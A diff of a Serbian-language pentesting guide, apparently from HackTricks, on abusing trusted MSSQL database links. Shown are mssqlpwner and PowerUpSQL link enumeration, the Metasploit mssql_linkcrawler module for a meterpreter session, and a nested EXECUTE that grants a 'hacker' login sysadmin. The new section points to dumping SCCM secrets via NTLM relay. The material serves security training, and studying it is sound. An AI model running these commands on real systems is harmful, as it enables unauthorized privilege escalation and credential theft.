@@ -7,7 +7,7 @@
 
 ### Python
 
-Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se zasniva na impacket-u, i takođe omogućava autentifikaciju koristeći kerberos karte, i napad kroz lanac veza.
+Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se zasniva na impacket-u, i takođe omogućava autentifikaciju koristeći kerberos karte, i napad kroz lanac linkova.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -90,7 +90,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Modul powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
+Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.
 ```bash
 Import-Module .\PowerupSQL.psd1
 ````
@@ -180,7 +180,7 @@ Ako je MSSQL instanca pouzdana (povezana baza) od strane druge MSSQL instance. A
 
 **Povezane baze funkcionišu čak i preko šuma poverenja.**
 
-### Zloupotreba Powershell-a
+### Powershell Zloupotreba
 ```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -226,11 +226,11 @@ Možete lako proveriti pouzdane linkove koristeći metasploit.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Obratite pažnju da će metasploit pokušati da iskoristi samo `openquery()` funkciju u MSSQL (dakle, ako ne možete da izvršite komandu sa `openquery()`, moraćete da pokušate `EXECUTE` metodu **ručno** da izvršite komande, više informacija u nastavku.)
+Obratite pažnju da će metasploit pokušati da zloupotrebi samo `openquery()` funkciju u MSSQL (dakle, ako ne možete da izvršite komandu sa `openquery()`, moraćete da pokušate `EXECUTE` metodu **ručno** da izvršite komande, više informacija u nastavku.)
 
 ### Ručno - Openquery()
 
-Sa **Linux**-a možete dobiti MSSQL konzolnu ljusku sa **sqsh** i **mssqlclient.py.**
+Sa **Linux**-a možete dobiti MSSQL konzolu sa **sqsh** i **mssqlclient.py.**
 
 Sa **Windows**-a takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
 
@@ -281,5 +281,11 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 Strategija koju su mnogi autori smislili je da primoraju SYSTEM servis da se autentifikuje na lažni ili man-in-the-middle servis koji napadač kreira. Ovaj lažni servis tada može imitirati SYSTEM servis dok pokušava da se autentifikuje.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju ovih raznih tehnika koje se mogu izvršiti putem Beacon-ove `execute-assembly` komande.
+
+### SCCM Tačka Upravljanja NTLM Preusmeravanje (Ekstrakcija OSD Tajni)
+Pogledajte kako se podrazumevane SQL uloge SCCM **Tačaka Upravljanja** mogu zloupotrebiti za dumpovanje tajni Mrežnog Pristupnog Naloga i Task-Sequence direktno iz baze podataka sajta:
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
